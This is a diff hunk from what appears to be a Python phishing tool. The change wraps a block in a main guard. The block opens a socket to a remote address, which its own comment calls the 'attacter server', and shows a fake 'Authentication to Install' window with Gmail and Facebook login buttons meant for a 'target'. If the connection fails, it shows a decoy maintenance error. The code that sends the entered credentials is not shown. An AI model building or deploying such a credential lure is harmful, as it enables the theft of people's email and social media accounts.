@@ -84,22 +84,23 @@ def on_closing(client):
         client.send("close".encode());
         window.destroy()
 
-client = socket.socket()
-client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-client.settimeout(2000)
-try:
-    client.connect((REMOTE_IP,REMOTE_PORT))
-    window = Tk();
-    window.title("Login")
-    window.geometry("400x200")
-    window.resizable(False,False)
-    window.protocol("WM_DELETE_WINDOW", lambda:on_closing(client=client))
-    lbl1 = Label(text="Authentication to Install",font=("Arial",15)).pack(pady=10)
-    btn1 = Button(text="Gmail Login",width=25,command=lambda:btn_Event(isFacebook=False))
-    btn1.pack(pady=20)
-    btn2 = Button(text="Facebook Login",width=25,command=lambda:btn_Event(isFacebook=True))
-    btn2.pack(pady=20)
-    mainloop()
-except:
-    #what if target can't connect to attacter server, this will be shown
-    messagebox.showerror("SERVER ERROR","Server is now in maintainence, Please try again later. Sorry for your inconvenience")
+if __name__ == "__main__":
+    client = socket.socket()
+    client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+    client.settimeout(2000)
+    try:
+        client.connect((REMOTE_IP,REMOTE_PORT))
+        window = Tk();
+        window.title("Login")
+        window.geometry("400x200")
+        window.resizable(False,False)
+        window.protocol("WM_DELETE_WINDOW", lambda:on_closing(client=client))
+        lbl1 = Label(text="Authentication to Install",font=("Arial",15)).pack(pady=10)
+        btn1 = Button(text="Gmail Login",width=25,command=lambda:btn_Event(isFacebook=False))
+        btn1.pack(pady=20)
+        btn2 = Button(text="Facebook Login",width=25,command=lambda:btn_Event(isFacebook=True))
+        btn2.pack(pady=20)
+        mainloop()
+    except:
+        #what if target can't connect to attacter server, this will be shown
+        messagebox.showerror("SERVER ERROR","Server is now in maintainence, Please try again later. Sorry for your inconvenience")
